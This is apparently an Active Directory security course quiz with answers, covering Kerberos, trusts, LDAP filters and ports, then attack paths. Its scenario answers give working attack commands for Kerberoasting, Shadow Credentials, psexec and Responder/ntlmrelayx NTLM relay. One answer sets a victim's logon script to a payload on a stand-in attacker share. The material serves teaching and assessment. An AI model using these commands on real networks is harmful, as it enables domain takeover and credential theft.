# AD Fundamentals Exercises

Test your understanding of Active Directory concepts with these practice questions.

## Multiple Choice Questions

### Question 1
What is the primary purpose of the krbtgt account in Active Directory?

A) To authenticate administrators
B) To encrypt Ticket Granting Tickets (TGTs)
C) To store user passwords
D) To manage DNS records

<details>
<summary>Answer</summary>

**B) To encrypt Ticket Granting Tickets (TGTs)**

The krbtgt account's password hash is used to encrypt and sign all TGTs in the domain. This is why compromising the krbtgt hash allows an attacker to forge Golden Tickets.
</details>

---

### Question 2
Which userAccountControl flag indicates an account is vulnerable to AS-REP roasting?

A) TRUSTED_FOR_DELEGATION
B) DONT_EXPIRE_PASSWORD
C) DONT_REQ_PREAUTH
D) SMARTCARD_REQUIRED

<details>
<summary>Answer</summary>

**C) DONT_REQ_PREAUTH (0x400000)**

When this flag is set, the account does not require Kerberos pre-authentication. An attacker can request an AS-REP and attempt to crack it offline.
</details>

---

### Question 3
What is the difference between Domain Admins and Enterprise Admins?

A) No difference, they are the same
B) Domain Admins exist in all domains; Enterprise Admins only in the root domain
C) Enterprise Admins have access to a single domain only
D) Domain Admins can modify the schema; Enterprise Admins cannot

<details>
<summary>Answer</summary>

**B) Domain Admins exist in all domains; Enterprise Admins only in the root domain**

Domain Admins have full control within their domain. Enterprise Admins only exist in the forest root domain and have administrative rights across all domains in the forest.
</details>

---

### Question 4
Which protocol is primarily used for authentication in a modern AD environment?

A) NTLM
B) LDAP
C) Kerberos
D) RADIUS

<details>
<summary>Answer</summary>

**C) Kerberos**

Kerberos is the default authentication protocol in Active Directory. NTLM is still supported as a fallback but is considered less secure.
</details>

---

### Question 5
What does a Service Principal Name (SPN) identify?

A) A user's email address
B) A service running on a specific host
C) A domain controller
D) A Group Policy Object

<details>
<summary>Answer</summary>

**B) A service running on a specific host**

SPNs identify the service class, host, and optional port for Kerberos authentication. Example: MSSQLSvc/sql01.corp.local:1433
</details>

---

## True or False

### Question 6
NTLM authentication involves the password hash being sent over the network.

<details>
<summary>Answer</summary>

**True**

In NTLM authentication, the password hash is used to create a challenge response that is sent over the network. This enables pass-the-hash attacks and NTLM relay attacks.
</details>

---

### Question 7
A two-way trust means both domains can access resources in each other.

<details>
<summary>Answer</summary>

**True**

In a two-way trust, users from Domain A can access resources in Domain B, and users from Domain B can access resources in Domain A.
</details>

---

### Question 8
Group Policy Objects can only be applied to user accounts.

<details>
<summary>Answer</summary>

**False**

GPOs can be applied to both user accounts and computer accounts. GPOs contain both Computer Configuration and User Configuration sections.
</details>

---

### Question 9
The Global Catalog contains a full replica of all objects in the forest.

<details>
<summary>Answer</summary>

**False**

The Global Catalog contains a **partial** replica of all objects in the forest (a subset of attributes). It contains full replicas only for objects in its own domain.
</details>

---

### Question 10
Computer accounts in Active Directory have passwords that change automatically.

<details>
<summary>Answer</summary>

**True**

By default, computer account passwords are automatically changed every 30 days. This is controlled by the domain policy "Maximum machine account password age."
</details>

---

## Short Answer

### Question 11
Explain why the AdminSDHolder mechanism can create security issues if not properly managed.

<details>
<summary>Answer</summary>

AdminSDHolder protects privileged accounts by overwriting their ACLs every 60 minutes with the ACL from the AdminSDHolder container. Security issues arise when:

1. **Orphaned adminCount**: Users removed from privileged groups retain adminCount=1 and protected ACLs but may have stale permissions
2. **ACL reset delay**: Legitimate permission changes are reverted every hour
3. **Abuse vector**: Modifying AdminSDHolder ACL affects all protected objects

Attackers look for accounts with adminCount=1 that are no longer in privileged groups, as they may have residual elevated permissions.
</details>

---

### Question 12
What are three methods an attacker could use to obtain credential material from an Active Directory environment?

<details>
<summary>Answer</summary>

Common methods include:

1. **Kerberoasting**: Request TGS tickets for service accounts and crack them offline
2. **AS-REP Roasting**: Request AS-REP for accounts without pre-auth and crack them
3. **NTLM Relay**: Intercept and relay NTLM authentication to other services
4. **DCSync**: Use directory replication to extract password hashes
5. **LSASS Memory Dump**: Extract credentials from lsass.exe process
6. **SAM Database**: Extract local hashes from SAM database
7. **Volume Shadow Copy**: Access offline copies of NTDS.dit
8. **GPP Passwords**: Find passwords in Group Policy Preferences files
9. **Credential harvesting tools**: Mimikatz, secretsdump, etc.

(Any 3 valid methods is acceptable)
</details>

---

### Question 13
Describe the difference between a Golden Ticket and a Silver Ticket attack.

<details>
<summary>Answer</summary>

**Golden Ticket:**
- Requires: krbtgt hash
- Creates: Forged TGT (Ticket Granting Ticket)
- Scope: Access to any service in the domain
- Validity: Up to 10 years (configurable)
- Detection: Hard to detect, bypasses normal authentication
- Scope of compromise: Entire domain

**Silver Ticket:**
- Requires: Service account hash
- Creates: Forged TGS (Service Ticket)
- Scope: Access to specific service only
- Validity: Default 10 hours (can be set longer)
- Detection: Easier to detect (no TGT request logged)
- Scope of compromise: Single service

Key difference: Golden Tickets provide domain-wide access, while Silver Tickets are limited to specific services.
</details>

---

## Practical Exercises

### Exercise 1: LDAP Query Construction
Write an LDAP filter to find:
1. All enabled user accounts
2. All users with "Admin" in their name
3. All accounts that don't require Kerberos pre-authentication

<details>
<summary>Answer</summary>

```ldap
# 1. All enabled user accounts
(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# 2. All users with "Admin" in their name
(&(objectCategory=person)(objectClass=user)(name=*Admin*))

# 3. Accounts that don't require Kerberos pre-auth (AS-REP roastable)
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

Note: The OID 1.2.840.113556.1.4.803 is a bitwise AND matching rule for userAccountControl.
</details>

---

### Exercise 2: SID Interpretation
Given the following SID: `S-1-5-21-3623811015-3361044348-30300820-1013`

1. What type of account might this be?
2. What is the RID?
3. How can you determine what domain this belongs to?

<details>
<summary>Answer</summary>

1. **Type of account**: This is likely a regular user or group account (RID > 1000 indicates it was created after the default accounts)

2. **RID**: 1013 (the last number in the SID)

3. **Determining the domain**:
   - The domain SID is `S-1-5-21-3623811015-3361044348-30300820`
   - You can query AD for the domain with this SID using PowerShell:
   ```powershell
   [System.Security.Principal.SecurityIdentifier]::new("S-1-5-21-3623811015-3361044348-30300820").Translate([System.Security.Principal.NTAccount])
   ```
   - Or use `lookupsid.py` from Impacket
</details>

---

### Exercise 3: Attack Path Analysis
Given the following information, identify potential attack paths to Domain Admin:

- User "jsmith" is a member of "IT-Support" group
- "IT-Support" has GenericAll on user "svc_backup"
- "svc_backup" is a member of "Backup Operators"
- "Backup Operators" has SeBackupPrivilege

<details>
<summary>Answer</summary>

**Attack Path:**

1. **Compromise jsmith** (initial access)

2. **Abuse GenericAll on svc_backup**:
   - Reset svc_backup's password
   - OR set an SPN and Kerberoast
   - OR set targeted Kerberoasting (change to weak password, roast, revert)

3. **Use svc_backup's Backup Operator privileges**:
   - SeBackupPrivilege allows reading any file on the system
   - Use it to copy NTDS.dit from a Domain Controller
   - Extract SAM and SYSTEM registry hives

4. **Extract credentials**:
   - Use secretsdump to extract hashes from NTDS.dit
   - Obtain Domain Admin hash

5. **Pass-the-hash to Domain Admin**

Alternative path: Use Backup Operators membership to backup and read the NTDS.dit file directly, bypassing file permissions.
</details>

---

### Exercise 4: Protocol Analysis
A packet capture shows the following ports being used. Identify each protocol and its purpose in AD:

1. TCP 88
2. TCP 389
3. TCP 445
4. TCP 3268
5. TCP 135

<details>
<summary>Answer</summary>

1. **TCP 88 - Kerberos**
   - Kerberos authentication protocol
   - Used for AS-REQ/AS-REP and TGS-REQ/TGS-REP exchanges

2. **TCP 389 - LDAP**
   - Lightweight Directory Access Protocol
   - Used for directory queries and modifications

3. **TCP 445 - SMB/CIFS**
   - Server Message Block
   - File sharing, named pipes, RPC over SMB

4. **TCP 3268 - Global Catalog (LDAP)**
   - LDAP to Global Catalog server
   - Forest-wide searches and Universal Group membership

5. **TCP 135 - RPC Endpoint Mapper**
   - Microsoft RPC service
   - Negotiates dynamic port for RPC communication
</details>

---

## Scenario-Based Questions

### Scenario 1
You've gained access to a standard domain user account. You run BloodHound and discover the following path:

```
Your User → MemberOf → Help Desk Group → GenericWrite → IT Admin User → MemberOf → Domain Admins
```

Describe step-by-step how you would exploit this path.

<details>
<summary>Answer</summary>

**Step 1: Abuse GenericWrite on IT Admin User**

GenericWrite allows modifying most attributes. Options include:

a) **Add SPN for Kerberoasting** (preferred - stealthier):
```powershell
Set-DomainObject -Identity "IT Admin User" -Set @{serviceprincipalname='fake/service'}
# Request and crack the TGS
```

b) **Set logon script**:
```powershell
Set-DomainObject -Identity "IT Admin User" -Set @{scriptpath='\\attacker\share\payload.exe'}
# Wait for next logon
```

c) **Shadow Credentials attack** (if AD CS available):
```
Whisker.exe add /target:"IT Admin User"
```

**Step 2: Obtain IT Admin credentials**

If Kerberoasting:
```bash
GetUserSPNs.py domain.com/your_user:password -dc-ip DC_IP
hashcat -m 13100 tgs_hash.txt wordlist.txt
```

**Step 3: Authenticate as Domain Admin**

Use the cracked/obtained credentials:
```bash
psexec.py domain.com/'IT Admin User':'password'@dc01.domain.com
```

**Cleanup: Remove the SPN you added**
```powershell
Set-DomainObject -Identity "IT Admin User" -Clear serviceprincipalname
```
</details>

---

### Scenario 2
During an assessment, you discover that LLMNR and NBT-NS are enabled on the network. You also notice SMB signing is not required. How would you leverage these misconfigurations?

<details>
<summary>Answer</summary>

**Attack: NTLM Relay via LLMNR/NBT-NS Poisoning**

**Step 1: Start Responder in Analyze mode** (to identify traffic):
```bash
responder -I eth0 -A
```

**Step 2: Start ntlmrelayx** targeting machines without SMB signing:
```bash
# First, find targets without SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Start relay
ntlmrelayx.py -tf targets.txt -smb2support
```

**Step 3: Start Responder** to poison LLMNR/NBT-NS:
```bash
responder -I eth0 -wrfv
```

**Attack Flow:**
1. Victim mistypes a share name (e.g., \\fileservre instead of \\fileserver)
2. DNS fails, LLMNR/NBT-NS broadcast occurs
3. Responder responds with attacker IP
4. Victim authenticates to attacker
5. ntlmrelayx relays credentials to target with SMB signing disabled
6. If successful, get command execution on target

**Alternative - Credential Capture:**
If relay isn't possible, just capture hashes:
```bash
responder -I eth0 -wrfv
# Crack captured hashes offline with hashcat -m 5600
```
</details>

---

## Reflection Questions

1. Why is Kerberos considered more secure than NTLM, yet still has significant attack surface?

2. If you were defending an AD environment, what would be your top 5 priorities to reduce attack surface?

3. How does understanding the AD structure help in planning both attacks and defenses?

Think through these questions and discuss with peers or mentors for deeper understanding.
